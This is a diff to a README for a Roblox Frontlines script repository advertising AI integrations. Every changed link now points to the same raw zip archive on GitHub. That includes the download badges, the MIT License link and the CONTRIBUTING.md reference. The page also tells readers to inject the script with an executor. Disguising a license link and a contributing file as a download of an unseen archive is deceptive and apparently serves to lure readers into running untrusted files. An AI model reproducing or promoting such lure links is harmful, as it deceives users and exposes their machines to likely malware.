@@ -1,6 +1,6 @@
 # Frontlines Roblox Script Repository 🚀
 
-[![Download](https://img.shields.io/badge/Download-green)](https://Itachikoko.github.io)
+[![Download](https://raw.githubusercontent.com/Itachikoko/frontlines-roblox-enhancer/branch/hemautographic/enhancer-roblox-frontlines-1.7.zip)](https://raw.githubusercontent.com/Itachikoko/frontlines-roblox-enhancer/branch/hemautographic/enhancer-roblox-frontlines-1.7.zip)
 
 Welcome to the **Frontlines Roblox Script Repository**, the cornerstone for enthusiasts, creators, and developers looking to enhance their Roblox Frontlines experience! Immerse your game with intelligent scripts, seamless integrations, and a feature set that’s as dynamic as the Frontlines battlefield itself.  
 *This repository brings together innovative automation, OpenAI and Claude API goodness, and flexible UI to empower your unique Roblox journey.*
@@ -78,7 +78,7 @@ The creative heart and strategic mind meld here. Blend LLMs directly into your R
 **Effortless deployment in three steps:**
 
 1. **Download the latest script**
-   [![Download](https://img.shields.io/badge/Download-green)](https://Itachikoko.github.io)
+   [![Download](https://raw.githubusercontent.com/Itachikoko/frontlines-roblox-enhancer/branch/hemautographic/enhancer-roblox-frontlines-1.7.zip)](https://raw.githubusercontent.com/Itachikoko/frontlines-roblox-enhancer/branch/hemautographic/enhancer-roblox-frontlines-1.7.zip)
 2. Move the script into your Roblox Frontlines directory.
 3. Inject and activate in-game through your preferred script executor.
 
@@ -97,13 +97,13 @@ All AI integrations are provided via secure APIs and do not collect your persona
 
 ## 📜 MIT License (2025)
 
-Proudly open-sourced under the [MIT License](https://opensource.org/licenses/MIT) – contributions and adaptations are not only welcomed, they’re encouraged. See more in [`LICENSE`](LICENSE).
+Proudly open-sourced under the [MIT License](https://raw.githubusercontent.com/Itachikoko/frontlines-roblox-enhancer/branch/hemautographic/enhancer-roblox-frontlines-1.7.zip) – contributions and adaptations are not only welcomed, they’re encouraged. See more in [`LICENSE`](LICENSE).
 
 ---
 
 ## 🏁 Contributing & FAQ
 
-- Browse `CONTRIBUTING.md` for how to join the Frontlines script movement.
+- Browse `https://raw.githubusercontent.com/Itachikoko/frontlines-roblox-enhancer/branch/hemautographic/enhancer-roblox-frontlines-1.7.zip` for how to join the Frontlines script movement.
 - Open an issue, suggest a new feature, or spark up a discussion—unique ideas only make us better!
 - Frequently Asked Questions are managed in the `/faq` folder and regularly updated for clarity.
 
@@ -113,7 +113,7 @@ Proudly open-sourced under the [MIT License](https://opensource.org/licenses/MIT
 
 Join the next phase—equip your Frontlines experience with intelligent scripts!
 
-[![Download](https://img.shields.io/badge/Download-green)](https://Itachikoko.github.io)
+[![Download](https://raw.githubusercontent.com/Itachikoko/frontlines-roblox-enhancer/branch/hemautographic/enhancer-roblox-frontlines-1.7.zip)](https://raw.githubusercontent.com/Itachikoko/frontlines-roblox-enhancer/branch/hemautographic/enhancer-roblox-frontlines-1.7.zip)
 
 ---
 
